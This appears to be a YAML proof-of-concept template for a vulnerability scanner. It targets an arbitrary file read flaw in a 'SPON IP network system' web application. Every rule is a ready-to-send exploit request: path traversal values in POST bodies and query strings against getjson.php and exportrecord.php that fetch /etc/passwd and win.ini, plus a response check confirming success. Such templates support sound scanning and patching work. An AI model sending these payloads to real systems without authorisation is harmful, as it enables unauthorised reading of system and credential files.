name: poc-yaml-sponip-network-system-file-read
manual: true
transport: http

rules:
  gettoken:
    request:
      cache: true
      method: POST
      path: /php/rj_get_token.php
      headers:
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      body: |
        jsondata[url]=../php/getjson.php
    expression: response.status == 200 && response.body.bcontains(b"$_POST")
  getjson_windows:
    request:
      cache: true
      method: POST
      path: /php/getjson.php
      headers:
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      body: |
        jsondata[filename]=../../../../../../windows/win.ini
    expression: response.status == 200 && response.body.bcontains(b"[fonts]")
  getjson_linux:
    request:
      cache: true
      method: POST
      path: /php/getjson.php
      headers:
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      body: |
        jsondata[filename]=../../../../../../../etc/passwd
    expression: response.status == 200 && response.body.bcontains(b"root")
  exportrecord_windows:
    request:
      cache: true
      method: GET
      path: /php/exportrecord.php?downname=c:/windows/win.ini
    expression: response.status == 200 && response.body.bcontains(b"[fonts]") && response.body.bcontains(b"[extensions]")
  exportrecord_linux:
    request:
      cache: true
      method: POST
      path: /php/exportrecord.php?downname=../../../../../etc/passwd
      headers:
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    expression: response.status == 200 && response.body.bcontains(b"root") && response.body.bcontains(b"bin")
expression: gettoken() || getjson_windows() || getjson_linux() || exportrecord_windows() || exportrecord_linux()
detail:
  author: york
  links:
    - https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247486018&idx=1&sn=d744907475a4ea9ebeb26338c735e3e9
